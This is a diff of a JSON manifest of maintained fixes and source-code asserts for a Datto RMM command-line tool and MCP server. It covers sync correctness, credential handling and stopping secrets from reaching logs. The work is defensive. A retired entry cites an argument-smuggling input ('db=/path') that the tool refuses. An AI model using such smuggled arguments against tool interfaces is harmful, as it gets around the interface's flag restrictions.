+     "contains": "func TestSprawlRefreshReadsEverySoftwarePage(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-gaps-any-failure-signal-wins",
+   "status": "active",
+   "summary": "`fleet sync-gaps` reports a partition whose last sync attempt did not finish (sync_state.last_attempt_complete = 0, or never completed) as incomplete, whatever its counts say; a complete sync still reads as ok",
+   "why": "Codex review r1 class incomplete sync reported healthy (P1): the recorded count is the count of rows sync stored, so a sync that stopped before the documented next page showed no drift and read as ok with no gaps.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_sync_gaps.go",
+     "contains": "case !st.complete || st.lastSyncedAt == \"\":",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync_gaps.go",
+     "contains": "COALESCE(last_attempt_complete, 0) FROM sync_state",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_syncgaps_test.go",
+     "contains": "func TestSyncGapsReportsAnUnfinishedPartition(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-posture-reads-the-documented-enums",
+   "status": "active",
+   "summary": "Antivirus and patch posture read Datto's documented enums: one normalizer (letters and digits only) so --status not-running matches NotRunning; av-gaps refuses a --status that is no documented status; a device is patched only with patchStatus FullyPatched and no pending or not-approved patch",
+   "why": "Codex review r1 class documented enum misread (P1): av-gaps normalized not-running to 'not running' and never matched Datto's NotRunning; scorecard counted a NoData device (zero counters, nothing known) as patched.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_av_gaps.go",
+     "contains": "func validateAvStatusFilter(status string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_shared.go",
+     "contains": "func patchIsHealthy(p fleetPatch) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_scorecard.go",
+     "contains": "if patchIsHealthy(d.PatchManagement) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_enum_test.go",
+     "contains": "func TestFleetPostureReadsTheDocumentedEnums(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-alerts-one-record-per-uid",
+   "status": "active",
+   "summary": "The fleet analytics read one record per alertUid across the open and resolved partitions, and a resolved record wins",
+   "why": "Codex review r1 class one record counted in two partitions (P1): an alert synced while open keeps its open row until a full sync prunes it and sits in the resolved partition once resolved; the partitions were concatenated, so it counted twice in storms and as open on the scorecard.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_shared.go",
+     "contains": "if a.Resolved && !out[i].Resolved {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv1_alerts_test.go",
+     "contains": "func TestFleetAlertsCountOneRecordPerAlert(t *testing.T) {",
+     "code_only": true
     }
    ]
   },
@@ -726,6 +1384,557 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credential-identity-one-resolver",
+   "class": "credential-identity",
+   "status": "active",
+   "summary": "One resolver picks the credential in effect (DATTO_RMM_TOKEN in the environment, then a configured API key, then what is stored, with a config [headers] Authorization above stored values); every Authorization carrier and the store scope follow that one choice, and no spelling of Authorization stays in the header map the client applies last",
+   "why": "Codex review r2 classes credential identity mismatch and tenant store identity mismatch (P1). The client applied config headers after the bearer, so [headers] Authorization went out beside API key B and over DATTO_RMM_TOKEN B; with DATTO_RMM_TOKEN B and an ambient key A the store scope still followed key A, so B read and wrote A's store. Fixed once in dattoCredentialInEffect rather than per carrier.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "func dattoCredentialInEffect(c *Config) dattoCredentialKind {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "switch dattoCredentialInEffect(c) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "header := takeDattoHeaderAuthorization(c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if c.envOverrides[\"AuthHeaderVal\"] {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv2_classes_test.go",
+     "contains": "func TestR2OneBearerOnTheWire(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv2_classes_test.go",
+     "contains": "func TestR2StoreScopeNamesTheCredentialInEffect(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "refreshed-collection-replaces-inventory",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "`fleet sprawl --refresh` replaces each device's stored software with what Datto returned, and drops the inventory of a device the synced fleet no longer has; a device whose read failed keeps its last list and is reported",
+   "why": "Codex review r2 class refreshed collection keeps stale inventory (P1). store.Upsert's keep-richer merge kept the old software when Datto returned the documented software: [], so uninstalled software stayed in the fleet counts an MSP acts on. Live per-device collections go through store.ReplaceResource, which skips the merge and keeps the credential-field scrub.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/datto_replace.go",
+     "contains": "func (s *Store) ReplaceResource(resourceType, id string, data json.RawMessage) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sprawl.go",
+     "contains": "db.ReplaceResource(fleetSoftwareResource, dev.UID, body)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sprawl.go",
+     "contains": "db.ReconcileAll(fleetSoftwareResource, uids, \"\", nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sprawl.go",
+     "not_contains": "db.Upsert(fleetSoftwareResource"
+    },
+    {
+     "file": "cli/internal/cli/datto_rv2_classes_test.go",
+     "contains": "func TestR2SprawlRefreshStatesTheCurrentInventory(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "inband-error-field-is-a-failure",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "A populated error field on an HTTP 200 page (documented on ActivityLogsPage) fails the read wherever a page's records would otherwise be kept: sync, so `fleet sync-gaps` reports the partition incomplete; a list read, one page or `--all`; export, walked or limited; and the novel page walker. A null or blank error field is a normal page",
+   "why": "Codex review r2 class incomplete sync reported healthy (P1). envelopeReportsFailure read only success, ok and status, so the documented ActivityLogsPage.error on HTTP 200 synced as complete and `fleet sync-gaps` said ok. --all and export kept the records and dropped the field the same way.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/datto_inband.go",
+     "contains": "func envelopeCarriesError(envelope map[string]json.RawMessage) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if envelopeCarriesError(envelope) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "reports a failure in its body; the read is incomplete",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_export.go",
+     "contains": "if responseDeclaresFailure(data) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_pages.go",
+     "contains": "if envelopeReportsFailure(body) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv2_classes_test.go",
+     "contains": "func TestR2ErrorFieldWinsOnEveryPage(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/datto_rv2_classes_test.go",
+     "contains": "func TestR2ErrorFieldFailsEveryListRead(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "\"%s: the response reports a failure in its body; the read is incomplete\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestErrorFieldFailsASinglePageRead(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces the print's own credential layer (held set, encodings, output chokepoint, secret funnel, outbound and split checks, origin pin, store and journal refusals). internal/credwire/declarations.go holds the one Declarations literal; each main starts with credkit.Start and ends with credkit.Exit; every API client gets the kit transport through the client hook (cli/credkit_client.go), and the feedback, webhook and token clients build theirs on it; every held value goes only to the API base URL this process uses; every file write outside the 0600 credential store and config goes through the kit; the store opens SQLite through credkit.SQLDriver; the MCP server passes MCPTools, MCPIn, MCPOut and MCPHTTP and runs CLI children through RunCommand.",
+   "why": "One contract, one matcher and one set of sinks replace the connector-only layer, and a matcher fix reaches this connector by vendoring. A reprint regenerates every sink, so each wiring point is asserted here. Kept honest by the built-binary tests in internal/credwire, each seen failing with its wiring point removed.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"*\", Allowed: []string{\"base_url\"}},",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-cli/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/datto-rmm-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_client.go",
+     "contains": "c.HTTPClient.Transport = config.OutboundGuard(base)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/datto_oauth.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "outKit = credkit.NewWriter(f, credkit.SinkFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/credkit_driver.go",
+     "contains": "sql.Register(KitSQLiteDriver, credkit.SQLDriver(&sqlite.Driver{}))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestHeldValuesNeverPrintOrLand(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestNonAPIHostsNeverCarryAHeldValue(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestCredentialNeverGoesOverPlainHTTP(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestConfigRefusalNeverPrintsItsCredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-hands-the-kit-whole-records",
+   "class": "streamed-output-truncated-by-kit",
+   "status": "active",
+   "summary": "export hands the credential kit whole records: no bufio.Writer over stdout, the --deliver tee or the kit file Writer. JSON-lines records are batched by exportRecords, --format json is one Write of the whole document, and the table printers go through a tabwriter over wholeLines, so each table line is one Write. TestNoChunkingWritersOverKitSinks fails on any chunking writer in the module outside the vendored kit.",
+   "why": "The press export wrote through a 4096-byte bufio.Writer, so every unit the kit checked ended inside a record. Past the kit's 16 KiB window the stream is lost and every later unit is withheld, so an ordinary export of a few hundred sites stopped after 20 KiB. Found on backup-radar; the same press writer shipped here.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/datto_export.go",
+     "contains": "records := &exportRecords{w: out}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/whole_records.go",
+     "contains": "func (l *wholeLines) Write(p []byte) (int, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/whole_records_test.go",
+     "contains": "func TestNoChunkingWritersOverKitSinks(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/export_test.go",
+     "contains": "func TestExportStreamsEveryRecord(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "profile-values-held",
+   "class": "saved-profile-values-held-at-startup",
+   "status": "active",
+   "summary": "A saved run profile is a credential source: at startup, inside credkit.Start, holdProfiles reads the current profiles.json under the default home and every --home and the legacy ~/.datto-rmm-cli/profiles.json, member by member so every duplicate key is seen, and holds each base-url value's password and query values (credkit.HoldURL) and each credential flag's value (credkit.Hold). Origins sends both sources nowhere.",
+   "why": "Kit rule 8(c). Before this neither store was read at startup, so profile show printed a saved password.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func holdProfiles(path string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"profile:base-url\", Allowed: nil},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/profiles_test.go",
+     "contains": "func TestSavedProfileValuesNeverPrint(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/profiles_test.go",
+     "contains": "func TestSavedProfileValueIsSentNowhere(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "base-url-shown-to-the-kit",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "DATTO_RMM_PLATFORM and DATTO_RMM_API_URL choose the API host, and the kit reads only BaseURL.Env: showBaseURL sets DATTO_RMM_BASE_URL for the length of credkit.Start when unset, and AfterStart clears it, so the kit's allowed origin is the host the program really uses.",
+   "why": "Without it a run on the zinfandel platform was refused its own host (seen failing, TestPlatformRoutesCredentialsToItsHost).",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func showBaseURL() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-cli/main.go",
+     "contains": "credwire.AfterStart()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/datto-rmm-mcp/main.go",
+     "contains": "credwire.AfterStart()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestPlatformRoutesCredentialsToItsHost(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name: the <PREFIX>_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares (any other is a placeholder, nothing after \"--\" is a flag); the failed flag is an opaque identity; teach.log records counts, not raw arguments. A stored value that repeats a held credential is the shared credential kit's job now (credkit-wiring: every file and SQLite write goes through it).",
+   "why": "Press 4.34.0 and 4.34.2 (learn/journal.go.tmpl) return the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included, and record every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query; and a credential given as a profile name or description, a recall or teach query or operand, or feedback is stored as typed. Known limits: a guessable override or typed name can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment; operator-named text that repeats no credential the process holds is a name and is kept. A reprint that drops these edits fails these asserts and TestJournalCredentialHardening; re-run tools/maintainer/apply_journal_hardening.py --slug <slug>. 2026-11-04 kit adoption: the RefuseHeld checks at each store and file (held_persist.go) are retired, replaced by the shared credential kit's file and SQLite sinks; the journal-shape asserts stay. Test: learn/journal_credential_hardening_test.go (the held pass holds through credkit.Hold).",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be an opaque identity; teach.log should not echo raw arguments; and every template that stores operator-named text should refuse one that repeats a held credential.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\treturn \"o:\" + hashHarnessSession(v)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\tif entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag + \":\" + hashHarnessSession(entry.FailedFlag)\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "\tlookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}\n\tisBoolFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && f.Value.Type() == \"bool\"\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "\tisDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}\n",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "ArgvShape:     learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {\n\tsum := sha256.Sum256([]byte(v))\n\treturn hex.EncodeToString(sum[:8])\n}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalHardeningStartupOverride(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalFailedFlagIdentity(",
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
+  }
+ ],
+ "_superseded": [
+  {
+   "id": "secret-echo-decoded-funnel",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "output-chokepoint",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "file-sinks-withheld",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "mcp-protocol-messages-withheld",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "network-sinks-withheld",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "startup-output-held-first",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "mcp-held-arguments-refused",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "undecoded-encodings-every-alignment",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "held-forms-in-every-encoding",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "response-credentials-held",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "every-text-encoding-withheld",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "outbound-split-parts-refused",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "auth-carrier-names-and-shapes-held",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "derived-credential-parts-held",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "output-units-reassembled",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "journal-entry-withheld-as-written",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "base85-family-withheld",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "short-held-values-matched-anywhere",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "output-split-across-deliveries",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "config-check-reads-back-every-shape",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "holder-holds-every-credential-part",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "decoded-forms-withheld",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "credential-names-match-datto-data",
+   "reason": "replaced by the shared credential kit"
+  },
+  {
+   "id": "api-origin-pinned",
+   "reason": "replaced by the shared credential kit"
   }
  ]
 }
